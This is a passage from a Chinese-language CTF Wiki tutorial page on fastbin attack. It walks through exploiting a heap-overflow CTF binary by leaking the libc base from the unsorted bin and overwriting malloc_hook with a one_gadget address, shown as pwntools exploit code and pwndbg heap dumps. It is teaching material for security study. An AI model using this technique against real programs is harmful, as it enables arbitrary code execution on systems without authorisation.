<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>LODWORD</span><span class=p>(</span><span class=n>a1</span><span class=p>[(</span><span class=kt>signed</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>result</span><span class=p>].</span><span class=n>inuse</span><span class=p>);</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>result</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=p>)</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=n>LODWORD</span><span class=p>(</span><span class=n>a1</span><span class=p>[</span><span class=n>v2</span><span class=p>].</span><span class=n>inuse</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=w>      </span><span class=n>a1</span><span class=p>[</span><span class=n>v2</span><span class=p>].</span><span class=n>size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>;</span>
<span class=w>      </span><span class=n>free</span><span class=p>(</span><span class=n>a1</span><span class=p>[</span><span class=n>v2</span><span class=p>].</span><span class=n>ptr</span><span class=p>);</span>
<span class=w>      </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kr>__int64</span><span class=p>)</span><span class=o>&amp;</span><span class=n>a1</span><span class=p>[</span><span class=n>v2</span><span class=p>];</span>
<span class=w>      </span><span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span><span class=w> </span><span class=o>*</span><span class=p>)(</span><span class=n>result</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>16</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>;</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>  </span><span class=p>}</span>
<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>result</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div> <p>dump 就是输出对应索引 chunk 的内容。</p> <h3 id=_27>利用思路<a class=headerlink href=#_27 title="Permanent link">&para;</a></h3> <p>可以确定的是，我们主要有的漏洞就是任意长度堆溢出。由于该程序几乎所有保护都开启了，所以我们必须要有一些泄漏才可以控制程序的流程。基本利用思路如下</p> <ul> <li>利用 unsorted bin 地址泄漏 libc 基地址。</li> <li>利用 fastbin attack 将chunk 分配到 malloc_hook 附近。</li> </ul> <h4 id=libc_1>泄漏 libc 基地址<a class=headerlink href=#libc_1 title="Permanent link">&para;</a></h4> <p>由于我们是希望使用 unsorted bin 来泄漏 libc 基地址，所以必须要有 chunk 可以被链接到 unsorted bin 中，所以该 chunk 不能使 fastbin chunk，也不能和 top chunk 相邻。因为前者会被添加到 fastbin 中，后者在不是fastbin 的情况下，会被合并到 top chunk 中。因此，我们这里构造一个 small bin chunk。在将该 chunk 释放到 unsorted bin 的同时，也需要让另外一个正在使用的 chunk 可以同时指向该 chunk 的位置。这样才可以进行泄漏。具体设计如下</p> <div class=highlight><pre><span></span><code>    <span class=c1># 1. leak libc base</span>
    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span>  <span class=c1># idx 0, 0x00</span>
    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span>  <span class=c1># idx 1, 0x20</span>
    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span>  <span class=c1># idx 2, 0x40</span>
    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span>  <span class=c1># idx 3, 0x60</span>
    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span>  <span class=c1># idx 4, 0x80</span>
    <span class=c1># free idx 1, 2, fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL</span>
    <span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</code></pre></div> <p>首先，我们申请了 5 个chunk，并释放了两个chunk，此时堆的情况如下。</p> <div class=highlight><pre><span></span><code>pwndbg&gt;<span class=w> </span>x/20gx<span class=w> </span>0x55a03ca22000
0x55a03ca22000:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000021<span class=w> </span>idx<span class=w> </span><span class=m>0</span>
0x55a03ca22010:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
0x55a03ca22020:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000021<span class=w> </span>idx<span class=w> </span><span class=m>1</span>
0x55a03ca22030:<span class=w> </span>0x000055a03ca22040<span class=w>  </span>0x0000000000000000
0x55a03ca22040:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000021<span class=w> </span>idx<span class=w> </span><span class=m>2</span>
0x55a03ca22050:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
0x55a03ca22060:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000021<span class=w> </span>idx<span class=w> </span><span class=m>3</span>
0x55a03ca22070:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
0x55a03ca22080:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000091<span class=w> </span>idx<span class=w> </span><span class=m>4</span>
0x55a03ca22090:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
pwndbg&gt;<span class=w> </span>fastbins
fastbins
0x20:<span class=w> </span>0x55a03ca22020<span class=w> </span>—▸<span class=w> </span>0x55a03ca22040<span class=w> </span>◂—<span class=w> </span>0x0
0x30:<span class=w> </span>0x0
0x40:<span class=w> </span>0x0
0x50:<span class=w> </span>0x0
0x60:<span class=w> </span>0x0
0x70:<span class=w> </span>0x0
0x80:<span class=w> </span>0x0
</code></pre></div> <p>当我们编辑 idx0 后，确实已经将其指向idx4了。这里之所以可以成功是因为堆的始终是 4KB 对齐的，所以idx 4的起始地址的第一个字节必然是0x80。</p> <div class=highlight><pre><span></span><code>    <span class=c1># edit idx 0 chunk to particial overwrite idx1&#39;s fd to point to idx4</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=mh>0x10</span> <span class=o>*</span> <span class=s1>&#39;a&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x21</span><span class=p>)</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span>
    <span class=n>fill</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=n>payload</span><span class=p>)</span>
</code></pre></div> <p>修改成功后如下</p> <div class=highlight><pre><span></span><code>pwndbg&gt;<span class=w> </span>x/20gx<span class=w> </span>0x55a03ca22000
0x55a03ca22000:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000021
0x55a03ca22010:<span class=w> </span>0x6161616161616161<span class=w>  </span>0x6161616161616161
0x55a03ca22020:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000021
0x55a03ca22030:<span class=w> </span>0x000055a03ca22080<span class=w>  </span>0x0000000000000000
0x55a03ca22040:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000021
0x55a03ca22050:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
0x55a03ca22060:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000021
0x55a03ca22070:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
0x55a03ca22080:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000091
0x55a03ca22090:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
pwndbg&gt;<span class=w> </span>fastbins
fastbins
0x20:<span class=w> </span>0x55a03ca22020<span class=w> </span>—▸<span class=w> </span>0x55a03ca22080<span class=w> </span>◂—<span class=w> </span>0x0
0x30:<span class=w> </span>0x0
0x40:<span class=w> </span>0x0
0x50:<span class=w> </span>0x0
0x60:<span class=w> </span>0x0
0x70:<span class=w> </span>0x0
0x80:<span class=w> </span>0x0
</code></pre></div> <p>那么，当我们再次申请两个时，第二个申请到的就是idx 4处的chunk。为了能够申请成功，我们需要确保 idx4 的size 与当前 fastbin 的大小一致，所以，我们得修改它的大小。申请成功后，idx2会指向idx4。</p> <div class=highlight><pre><span></span><code>    <span class=c1># if we want to allocate at idx4, we must set it&#39;s size as 0x21</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=mh>0x10</span> <span class=o>*</span> <span class=s1>&#39;a&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x21</span><span class=p>)</span>
    <span class=n>fill</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=n>payload</span><span class=p>)</span>
    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span>  <span class=c1># idx 1</span>
    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span>  <span class=c1># idx 2, which point to idx4&#39;s location</span>
</code></pre></div> <p>之后，如果我们想要将 idx 4 放到 unsorted bin 中的话，为了防止其与top chunk 合并，我们需要再次申请一个chunk。此后再释放 idx4 就会进入 unsorted bin中去了。此时由于 idx2 也指向这个地址，所以我们直接展示他的内容就可以得到unsorted bin的地址了。</p> <div class=highlight><pre><span></span><code>    <span class=c1># if want to free idx4 to unsorted bin, we must fix its size</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=mh>0x10</span> <span class=o>*</span> <span class=s1>&#39;a&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x91</span><span class=p>)</span>
    <span class=n>fill</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=n>payload</span><span class=p>)</span>
    <span class=c1># allocate a chunk in order when free idx4, idx 4 not consolidate with top chunk</span>
    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span>  <span class=c1># idx 5</span>
    <span class=n>free</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
    <span class=c1># as idx 2 point to idx4, just show this</span>
    <span class=n>dump</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Content: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>unsortedbin_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
    <span class=n>main_arena</span> <span class=o>=</span> <span class=n>unsortedbin_addr</span> <span class=o>-</span> <span class=n>offset_unsortedbin_main_arena</span>
    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;main arena addr: &#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>main_arena</span><span class=p>))</span>
    <span class=n>main_arena_offset</span> <span class=o>=</span> <span class=mh>0x3c4b20</span>
    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>main_arena</span> <span class=o>-</span> <span class=n>main_arena_offset</span>
    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;libc base addr: &#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</code></pre></div> <h4 id=chunkmalloc_hook>分配chunk到malloc_hook附近<a class=headerlink href=#chunkmalloc_hook title="Permanent link">&para;</a></h4> <p>由于 malloc hook 附近的 chunk 大小为 0x7f，所以数据区域为0x60。这里我们再次申请的时候，对应 fastbin 链表中没有相应大小chunk，所以根据堆分配器规则，它会依次处理unsorted bin中的chunk，将其放入到对应的bin中，之后会再次尝试分配 chunk，因为之前释放的 chunk 比当前申请的 chunk 大，所以可以从其前面分割出来一块。所以 idx2 仍然指向该位置，那么我们可以使用类似的办法先释放申请到的chunk，然后再次修改 fd 指针为 fake chunk 即可。此后我们修改 malloc_hook 处的指针即可得到触发 onegadget。</p> <p><div class=highlight><pre><span></span><code><span class=c1># 2. malloc to malloc_hook nearby</span>
<span class=c1># allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4</span>
<span class=n>allocate</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span>
<span class=n>free</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
<span class=c1># edit idx4&#39;s fd point to fake chunk</span>
<span class=n>fake_chunk_addr</span> <span class=o>=</span> <span class=n>main_arena</span> <span class=o>-</span> <span class=mh>0x33</span>
<span class=n>fake_chunk</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_chunk_addr</span><span class=p>)</span>
<span class=n>fill</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>fake_chunk</span><span class=p>),</span> <span class=n>fake_chunk</span><span class=p>)</span>

<span class=n>allocate</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span>  <span class=c1># idx 4</span>
<span class=n>allocate</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span>  <span class=c1># idx 6</span>

<span class=n>one_gadget_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x4526a</span>
<span class=n>payload</span> <span class=o>=</span> <span class=mh>0x13</span> <span class=o>*</span> <span class=s1>&#39;a&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>one_gadget_addr</span><span class=p>)</span>
<span class=n>fill</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=n>payload</span><span class=p>)</span>
<span class=c1># trigger malloc_hook</span>
<span class=n>allocate</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> 同时，这里的 onegadget 地址也可能需要尝试多次。</p> <h2 id=_28>题目<a class=headerlink href=#_28 title="Permanent link">&para;</a></h2> <ul> <li>L-CTF2016–pwn200</li> </ul> <h2 id=_29>参考文献<a class=headerlink href=#_29 title="Permanent link">&para;</a></h2> <ul> <li><a href=https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/ >https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/</a></li> <li><a href=http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html>http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html</a></li> <li><a href=https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717>https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717</a></li> </ul> </article> </div> </div> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../use-after-free/ class="md-footer__link md-footer__link--prev" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Previous </span> Use After Free </div> </div> </a> <a href=../unsorted-bin-attack/ class="md-footer__link md-footer__link--next" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Next </span> Unsorted Bin Attack </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-footer-copyright> <div class=md-footer-copyright__highlight> Copyright &copy; 2016 - 2023 CTF Wiki Team </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs Insiders </a> </div> </div> </div> </footer> </div> <script src=../../../../../../assets/javascripts/vendor.191088e8.min.js></script> <script src=../../../../../../assets/javascripts/bundle.d4cf0930.min.js></script><script id=__lang type=application/json>{"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing"}</script> <script>
        app = initialize({
          base: "../../../../../..",
          features: ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "search.highlight", "search.share"],
          search: Object.assign({
            worker: "../../../../../../assets/javascripts/worker/search.e77c40e2.min.js"
          }, typeof search !== "undefined" && search),
          version: {}
        })
      </script> <script src=https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js></script> <script src=https://ctf-wiki.org/static/js/extra.js></script> <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script> </body> </html>